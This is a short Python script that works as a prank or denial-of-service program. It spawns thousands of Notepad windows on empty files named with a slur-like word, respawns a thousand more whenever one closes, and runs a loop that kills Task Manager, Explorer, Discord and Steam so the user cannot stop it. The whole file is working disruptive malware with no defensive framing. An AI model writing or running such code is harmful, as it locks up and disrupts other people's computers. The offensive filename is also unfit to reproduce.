import os
import subprocess
import time
import sys
import psutil

BLOCKED_PROGRAMS = ["taskmgr", "discord", "steam", "explorer", ]

opened_files = []

def BokuNoPico(num_files):
    for i in range(num_files):
        filename = f"nogger_{len(opened_files)}.txt"
        with open(filename, 'w') as file:
            pass # CREATS EMPY FILES
        process = subprocess.Popen(['notepad', filename])
        opened_files.append(process)

        
def schnitzel():
    """Restarts the current program.""" 
    python = sys.executable
    os.execl(python, python, *sys.argv)
    
def WienerWurst():
    """Blocks specified programs by continuously checking and terminating them."""
    while True:
        for process in psutil.process_iter(['name']):
            if process.info['name'] in BLOCKED_PROGRAMS:
                try:
                    process.terminate()
                    print(f"Terminated {process.info['name']}")
                except psutil.NoSuchProcess:
                    pass
    
if __name__ == "__main__":
    BokuNoPico(3000)
    
    import threading
    blocker_thread = threading.Thread(target=WienerWurst, daemon=True)
    blocker_thread.start()
    
    try:
        while True:
            for process in opened_files[ : ]:
                if process.poll() is not None: #  Check whether the process has ended
                    opened_files.remove(process)
                    BokuNoPico(1000)
                
    except KeyboardInterrupt:
        schnitzel
